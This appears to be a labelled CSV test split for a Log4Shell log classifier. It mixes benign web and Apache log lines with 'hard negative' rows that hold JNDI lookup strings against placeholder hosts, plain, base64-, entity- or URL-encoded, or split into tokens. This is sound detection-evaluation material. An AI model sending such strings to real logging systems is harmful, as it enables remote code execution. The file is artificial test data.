id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-002989,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,blind_manual_test,low
LS-002990,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,blind_manual_test,low
LS-002991,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,blind_manual_test,low
LS-002992,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,blind_manual_test,low
LS-003593,2026-05-17,benign_apache_format,"203.243.9.31 - - [10/May/2015:00:00:00 +0000] ""GET /blog/security-hardening HTTP/1.1"" 200 5101 ""https://example.com/"" ""python-requests/2.31.0""","203.243.9.31 - - [10/may/2015:00:00:00 +0000] ""get /blog/security-hardening http/1.1"" 200 5101 ""https://example.com/"" ""python-requests/2.31.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003594,2026-05-17,benign_apache_format,"73.227.43.207 - - [11/May/2015:01:07:13 +0000] ""GET /blog/security-hardening HTTP/1.1"" 304 84127 ""https://example.com/"" ""Mozilla/5.0 Chrome/120.0""","73.227.43.207 - - [11/may/2015:01:07:13 +0000] ""get /blog/security-hardening http/1.1"" 304 84127 ""https://example.com/"" ""mozilla/5.0 chrome/120.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003595,2026-05-17,benign_apache_format,"136.11.174.112 - - [12/May/2015:02:14:26 +0000] ""GET /static/app.js HTTP/1.1"" 301 6434 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Java/11.0.13""","136.11.174.112 - - [12/may/2015:02:14:26 +0000] ""get /static/app.js http/1.1"" 301 6434 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003596,2026-05-17,benign_apache_format,"108.131.46.30 - - [13/May/2015:03:21:39 +0000] ""GET /index.html HTTP/1.1"" 304 44209 ""https://example.com/"" ""curl/7.88.1""","108.131.46.30 - - [13/may/2015:03:21:39 +0000] ""get /index.html http/1.1"" 304 44209 ""https://example.com/"" ""curl/7.88.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003597,2026-05-17,benign_apache_format,"57.130.45.40 - - [14/May/2015:04:28:52 +0000] ""GET /images/logo.png HTTP/1.1"" 301 178021 ""-"" ""Mozilla/5.0 Chrome/120.0""","57.130.45.40 - - [14/may/2015:04:28:52 +0000] ""get /images/logo.png http/1.1"" 301 178021 ""-"" ""mozilla/5.0 chrome/120.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003598,2026-05-17,benign_apache_format,"168.166.92.7 - - [15/May/2015:05:35:05 +0000] ""GET / HTTP/1.1"" 200 102348 ""-"" ""Java/11.0.13""","168.166.92.7 - - [15/may/2015:05:35:05 +0000] ""get / http/1.1"" 200 102348 ""-"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003599,2026-05-17,benign_apache_format,"47.211.165.67 - - [16/May/2015:06:42:18 +0000] ""GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1"" 200 13727 ""-"" ""python-requests/2.31.0""","47.211.165.67 - - [16/may/2015:06:42:18 +0000] ""get /presentations/logstash-monitorama-2013/images/kibana-search.png http/1.1"" 200 13727 ""-"" ""python-requests/2.31.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003600,2026-05-17,benign_apache_format,"203.121.252.131 - - [17/May/2015:07:49:31 +0000] ""GET /blog/security-hardening HTTP/1.1"" 301 30295 ""https://example.com/"" ""Mozilla/5.0 Chrome/120.0""","203.121.252.131 - - [17/may/2015:07:49:31 +0000] ""get /blog/security-hardening http/1.1"" 301 30295 ""https://example.com/"" ""mozilla/5.0 chrome/120.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003601,2026-05-17,benign_apache_format,"92.237.208.17 - - [18/May/2015:08:56:44 +0000] ""GET /presentations/logstash-monitorama-2013/images/kibana-dashboard3.png HTTP/1.1"" 200 106950 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""python-requests/2.31.0""","92.237.208.17 - - [18/may/2015:08:56:44 +0000] ""get /presentations/logstash-monitorama-2013/images/kibana-dashboard3.png http/1.1"" 200 106950 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""python-requests/2.31.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003602,2026-05-17,benign_apache_format,"15.137.51.64 - - [19/May/2015:09:03:57 +0000] ""GET /blog/security-hardening HTTP/1.1"" 404 205967 ""-"" ""PostmanRuntime/7.36.1""","15.137.51.64 - - [19/may/2015:09:03:57 +0000] ""get /blog/security-hardening http/1.1"" 404 205967 ""-"" ""postmanruntime/7.36.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003603,2026-05-17,benign_apache_format,"156.208.228.22 - - [20/May/2015:10:10:10 +0000] ""GET /blog/security-hardening HTTP/1.1"" 200 205355 ""-"" ""Java/11.0.13""","156.208.228.22 - - [20/may/2015:10:10:10 +0000] ""get /blog/security-hardening http/1.1"" 200 205355 ""-"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003604,2026-05-17,benign_apache_format,"149.86.125.138 - - [21/May/2015:11:17:23 +0000] ""GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1"" 304 118549 ""-"" ""Mozilla/5.0 Chrome/120.0""","149.86.125.138 - - [21/may/2015:11:17:23 +0000] ""get /presentations/logstash-monitorama-2013/images/kibana-search.png http/1.1"" 304 118549 ""-"" ""mozilla/5.0 chrome/120.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003605,2026-05-17,benign_apache_format,"219.237.148.168 - - [22/May/2015:12:24:36 +0000] ""GET /static/app.js HTTP/1.1"" 200 15902 ""https://example.com/"" ""PostmanRuntime/7.36.1""","219.237.148.168 - - [22/may/2015:12:24:36 +0000] ""get /static/app.js http/1.1"" 200 15902 ""https://example.com/"" ""postmanruntime/7.36.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003606,2026-05-17,benign_apache_format,"164.128.194.90 - - [23/May/2015:13:31:49 +0000] ""GET /static/style.css HTTP/1.1"" 304 220508 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""PostmanRuntime/7.36.1""","164.128.194.90 - - [23/may/2015:13:31:49 +0000] ""get /static/style.css http/1.1"" 304 220508 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""postmanruntime/7.36.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003607,2026-05-17,benign_apache_format,"22.82.35.77 - - [24/May/2015:14:38:02 +0000] ""GET /index.html HTTP/1.1"" 301 183217 ""-"" ""curl/7.88.1""","22.82.35.77 - - [24/may/2015:14:38:02 +0000] ""get /index.html http/1.1"" 301 183217 ""-"" ""curl/7.88.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003608,2026-05-17,benign_apache_format,"196.143.221.54 - - [25/May/2015:15:45:15 +0000] ""GET /docs/logging-best-practices HTTP/1.1"" 304 210382 ""https://example.com/"" ""Java/11.0.13""","196.143.221.54 - - [25/may/2015:15:45:15 +0000] ""get /docs/logging-best-practices http/1.1"" 304 210382 ""https://example.com/"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003609,2026-05-17,benign_apache_format,"173.133.231.70 - - [26/May/2015:16:52:28 +0000] ""GET /static/style.css HTTP/1.1"" 404 84443 ""https://example.com/"" ""python-requests/2.31.0""","173.133.231.70 - - [26/may/2015:16:52:28 +0000] ""get /static/style.css http/1.1"" 404 84443 ""https://example.com/"" ""python-requests/2.31.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003610,2026-05-17,benign_apache_format,"128.168.8.234 - - [27/May/2015:17:59:41 +0000] ""GET /static/app.js HTTP/1.1"" 404 664 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36""","128.168.8.234 - - [27/may/2015:17:59:41 +0000] ""get /static/app.js http/1.1"" 404 664 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 chrome/32.0 safari/537.36""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003611,2026-05-17,benign_apache_format,"12.4.88.106 - - [10/May/2015:18:06:54 +0000] ""GET /blog/security-hardening HTTP/1.1"" 404 184493 ""https://example.com/"" ""Go-http-client/1.1""","12.4.88.106 - - [10/may/2015:18:06:54 +0000] ""get /blog/security-hardening http/1.1"" 404 184493 ""https://example.com/"" ""go-http-client/1.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003612,2026-05-17,benign_apache_format,"148.41.39.138 - - [11/May/2015:19:13:07 +0000] ""GET / HTTP/1.1"" 404 116828 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Mozilla/5.0 Safari/605.1.15""","148.41.39.138 - - [11/may/2015:19:13:07 +0000] ""get / http/1.1"" 404 116828 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""mozilla/5.0 safari/605.1.15""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003613,2026-05-17,benign_apache_format,"101.192.183.100 - - [12/May/2015:20:20:20 +0000] ""GET /static/app.js HTTP/1.1"" 404 2338 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36""","101.192.183.100 - - [12/may/2015:20:20:20 +0000] ""get /static/app.js http/1.1"" 404 2338 ""-"" ""mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 chrome/32.0 safari/537.36""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003614,2026-05-17,benign_apache_format,"105.98.227.3 - - [13/May/2015:21:27:33 +0000] ""GET /static/style.css HTTP/1.1"" 404 5313 ""https://example.com/"" ""Java/11.0.13""","105.98.227.3 - - [13/may/2015:21:27:33 +0000] ""get /static/style.css http/1.1"" 404 5313 ""https://example.com/"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003615,2026-05-17,benign_apache_format,"60.46.155.207 - - [14/May/2015:22:34:46 +0000] ""GET /static/style.css HTTP/1.1"" 200 129576 ""https://example.com/"" ""Mozilla/5.0 Chrome/120.0""","60.46.155.207 - - [14/may/2015:22:34:46 +0000] ""get /static/style.css http/1.1"" 200 129576 ""https://example.com/"" ""mozilla/5.0 chrome/120.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003616,2026-05-17,benign_apache_format,"82.252.107.2 - - [15/May/2015:23:41:59 +0000] ""GET /static/style.css HTTP/1.1"" 404 103959 ""-"" ""PostmanRuntime/7.36.1""","82.252.107.2 - - [15/may/2015:23:41:59 +0000] ""get /static/style.css http/1.1"" 404 103959 ""-"" ""postmanruntime/7.36.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003617,2026-05-17,benign_apache_format,"156.252.87.142 - - [16/May/2015:00:48:12 +0000] ""GET /static/style.css HTTP/1.1"" 404 193803 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""curl/7.88.1""","156.252.87.142 - - [16/may/2015:00:48:12 +0000] ""get /static/style.css http/1.1"" 404 193803 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""curl/7.88.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003618,2026-05-17,benign_apache_format,"27.65.33.33 - - [17/May/2015:01:55:25 +0000] ""GET /images/logo.png HTTP/1.1"" 304 224386 ""-"" ""PostmanRuntime/7.36.1""","27.65.33.33 - - [17/may/2015:01:55:25 +0000] ""get /images/logo.png http/1.1"" 304 224386 ""-"" ""postmanruntime/7.36.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003619,2026-05-17,benign_apache_format,"60.11.129.175 - - [18/May/2015:02:02:38 +0000] ""GET /blog/security-hardening HTTP/1.1"" 301 640 ""https://example.com/"" ""Mozilla/5.0 Chrome/120.0""","60.11.129.175 - - [18/may/2015:02:02:38 +0000] ""get /blog/security-hardening http/1.1"" 301 640 ""https://example.com/"" ""mozilla/5.0 chrome/120.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003620,2026-05-17,benign_apache_format,"93.221.208.71 - - [19/May/2015:03:09:51 +0000] ""GET /index.html HTTP/1.1"" 404 135995 ""https://example.com/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36""","93.221.208.71 - - [19/may/2015:03:09:51 +0000] ""get /index.html http/1.1"" 404 135995 ""https://example.com/"" ""mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 chrome/32.0 safari/537.36""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003621,2026-05-17,benign_apache_format,"103.22.114.13 - - [20/May/2015:04:16:04 +0000] ""GET /images/logo.png HTTP/1.1"" 301 139696 ""https://example.com/"" ""Java/11.0.13""","103.22.114.13 - - [20/may/2015:04:16:04 +0000] ""get /images/logo.png http/1.1"" 301 139696 ""https://example.com/"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003622,2026-05-17,benign_apache_format,"12.200.99.86 - - [21/May/2015:05:23:17 +0000] ""GET /index.html HTTP/1.1"" 304 211854 ""-"" ""python-requests/2.31.0""","12.200.99.86 - - [21/may/2015:05:23:17 +0000] ""get /index.html http/1.1"" 304 211854 ""-"" ""python-requests/2.31.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003623,2026-05-17,benign_apache_format,"187.216.38.235 - - [22/May/2015:06:30:30 +0000] ""GET /static/style.css HTTP/1.1"" 200 43245 ""https://example.com/"" ""PostmanRuntime/7.36.1""","187.216.38.235 - - [22/may/2015:06:30:30 +0000] ""get /static/style.css http/1.1"" 200 43245 ""https://example.com/"" ""postmanruntime/7.36.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003624,2026-05-17,benign_apache_format,"27.49.14.123 - - [23/May/2015:07:37:43 +0000] ""GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1"" 200 155456 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Java/11.0.13""","27.49.14.123 - - [23/may/2015:07:37:43 +0000] ""get /presentations/logstash-monitorama-2013/images/kibana-search.png http/1.1"" 200 155456 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003625,2026-05-17,benign_apache_format,"75.126.55.122 - - [24/May/2015:08:44:56 +0000] ""GET /static/style.css HTTP/1.1"" 200 218367 ""-"" ""Java/11.0.13""","75.126.55.122 - - [24/may/2015:08:44:56 +0000] ""get /static/style.css http/1.1"" 200 218367 ""-"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003626,2026-05-17,benign_apache_format,"144.121.37.199 - - [25/May/2015:09:51:09 +0000] ""GET /docs/logging-best-practices HTTP/1.1"" 304 115085 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36""","144.121.37.199 - - [25/may/2015:09:51:09 +0000] ""get /docs/logging-best-practices http/1.1"" 304 115085 ""-"" ""mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 chrome/32.0 safari/537.36""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003627,2026-05-17,benign_apache_format,"159.63.43.250 - - [26/May/2015:10:58:22 +0000] ""GET / HTTP/1.1"" 200 99059 ""https://example.com/"" ""Mozilla/5.0 Safari/605.1.15""","159.63.43.250 - - [26/may/2015:10:58:22 +0000] ""get / http/1.1"" 200 99059 ""https://example.com/"" ""mozilla/5.0 safari/605.1.15""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003628,2026-05-17,benign_apache_format,"211.65.31.236 - - [27/May/2015:11:05:35 +0000] ""GET /presentations/logstash-monitorama-2013/images/kibana-dashboard3.png HTTP/1.1"" 200 79156 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Go-http-client/1.1""","211.65.31.236 - - [27/may/2015:11:05:35 +0000] ""get /presentations/logstash-monitorama-2013/images/kibana-dashboard3.png http/1.1"" 200 79156 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""go-http-client/1.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003629,2026-05-17,benign_apache_format,"27.52.28.144 - - [10/May/2015:12:12:48 +0000] ""GET / HTTP/1.1"" 200 222931 ""https://example.com/"" ""Go-http-client/1.1""","27.52.28.144 - - [10/may/2015:12:12:48 +0000] ""get / http/1.1"" 200 222931 ""https://example.com/"" ""go-http-client/1.1""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003630,2026-05-17,benign_apache_format,"35.210.119.222 - - [11/May/2015:13:19:01 +0000] ""GET /docs/logging-best-practices HTTP/1.1"" 404 163707 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36""","35.210.119.222 - - [11/may/2015:13:19:01 +0000] ""get /docs/logging-best-practices http/1.1"" 404 163707 ""-"" ""mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 chrome/32.0 safari/537.36""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003631,2026-05-17,benign_apache_format,"109.237.219.226 - - [12/May/2015:14:26:14 +0000] ""GET /docs/logging-best-practices HTTP/1.1"" 304 26677 ""https://example.com/"" ""Mozilla/5.0 Chrome/120.0""","109.237.219.226 - - [12/may/2015:14:26:14 +0000] ""get /docs/logging-best-practices http/1.1"" 304 26677 ""https://example.com/"" ""mozilla/5.0 chrome/120.0""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-003632,2026-05-17,benign_apache_format,"127.168.98.28 - - [13/May/2015:15:33:27 +0000] ""GET /index.html HTTP/1.1"" 200 156149 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Mozilla/5.0 Safari/605.1.15""","127.168.98.28 - - [13/may/2015:15:33:27 +0000] ""get /index.html http/1.1"" 200 156149 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""mozilla/5.0 safari/605.1.15""",0,benign,benign,external_like_benign_access_log,blind_manual_test,low
LS-004333,2026-05-17,hard_negative,User searched for Log4j mitigation guide trace_id=hardneg-blind_manual_test-0000,user searched for log4j mitigation guide trace_id=hardneg-blind_manual_test-0000,0,benign,keyword_only,mixed,blind_manual_test,low
LS-004334,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-blind_manual_test-0001,training note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-blind_manual_test-0001,0,benign,benign_fragmented_tutorial_text,mixed,blind_manual_test,low
LS-004335,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-blind_manual_test-0002,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-blind_manual_test-0002,0,benign,benign_documentation_example,mixed,blind_manual_test,low
LS-004336,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-blind_manual_test-0003,assert literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-blind_manual_test-0003,0,benign,benign_unit_test_fixture,mixed,blind_manual_test,low
LS-004337,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-blind_manual_test-0004,security_review indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-blind_manual_test-0004,0,benign,benign_scanner_report,mixed,blind_manual_test,low
LS-004338,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;sample.invalid&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-blind_manual_test-0005,get /preview?html=${jndi:ldap://sample.invalid/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-blind_manual_test-0005,0,benign,benign_html_entity_documentation,mixed,blind_manual_test,low
LS-004339,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-blind_manual_test-0006,assert literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-blind_manual_test-0006,0,benign,benign_unit_test_fixture,mixed,blind_manual_test,low
LS-004340,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-blind_manual_test-0007,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-blind_manual_test-0007,0,benign,benign_documentation_example,mixed,blind_manual_test,low
LS-004341,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9zYW1wbGUuaW52YWxpZC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-blind_manual_test-0008,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9zyw1wbguuaw52ywxpzc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-blind_manual_test-0008,0,benign,benign_base64_artifact,mixed,blind_manual_test,low
LS-004342,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-blind_manual_test-0009,assert literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-blind_manual_test-0009,0,benign,benign_unit_test_fixture,mixed,blind_manual_test,low
LS-004343,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-blind_manual_test-0010,security_review indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-blind_manual_test-0010,0,benign,benign_scanner_report,mixed,blind_manual_test,low
LS-004344,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-blind_manual_test-0011,security_review indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-blind_manual_test-0011,0,benign,benign_scanner_report,mixed,blind_manual_test,low
LS-004345,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdocs.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-blind_manual_test-0012,get /kb/log4shell?sample=${jndi:ldap://docs.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-blind_manual_test-0012,0,benign,benign_encoded_documentation,mixed,blind_manual_test,low
LS-004346,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-blind_manual_test-0013,training note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-blind_manual_test-0013,0,benign,benign_fragmented_tutorial_text,mixed,blind_manual_test,low
LS-004347,2026-05-17,hard_negative,Developer opened Java Naming and Directory Interface documentation trace_id=hardneg-blind_manual_test-0014,developer opened java naming and directory interface documentation trace_id=hardneg-blind_manual_test-0014,0,benign,documentation,mixed,blind_manual_test,low
LS-004348,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-blind_manual_test-0015,security_review indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-blind_manual_test-0015,0,benign,benign_scanner_report,mixed,blind_manual_test,low
LS-004349,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9zYW1wbGUuaW52YWxpZC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-blind_manual_test-0016,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9zyw1wbguuaw52ywxpzc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-blind_manual_test-0016,0,benign,benign_base64_artifact,mixed,blind_manual_test,low
